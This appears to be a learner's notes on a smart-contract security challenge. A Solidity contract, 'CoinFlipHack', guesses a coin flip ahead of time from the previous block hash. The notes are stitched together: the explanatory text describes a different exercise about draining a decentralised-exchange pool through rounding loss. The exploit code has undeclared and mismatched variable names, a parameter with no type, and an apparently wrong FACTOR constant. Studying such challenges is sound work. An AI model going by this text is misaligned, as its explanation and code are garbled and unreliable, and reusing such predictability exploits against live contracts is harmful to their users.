#COIN FLIP

##requirement:
winning streak by guessing the outcome of the coin flip.

function can be called only once in every block .

logic: since there are no floating points in solidity, precision is lost as numbers are rounded off leading to exploits. 

detail :
dex :dex stands for decentralised exchange

in decentralised exchanges , there are liquidity pools. inside of the pools have tokens of different kinds. and there are liquidity providers. 

advantage of liquidity pool : there need not be two ppl who want to swap tokens to be online, the other liquidity providers in the pool can come in handy , if either of the persons invloved in the swap is not present right at the moment.

the aim is to drain any one of the two tokens completely from the pool .

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(guessing) external returns (bool);
}

contract CoinFlipHack {
    ICoinFlip public coinFlip;
    uint256 FACTOR = 1157920892373161954235709850086879078532699846656405640394575840079131296399;

    constructor(address _coinFlipAddress) {
        coinFlip = ICoinFlip(coinFlipAddress);
    }

    function hackFlip() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlipResult = blockValue / FACTOR;
        guessing = coinFlipResult == 1 ? true : false;
        coinFlip.flip(guess);
    }
}
```
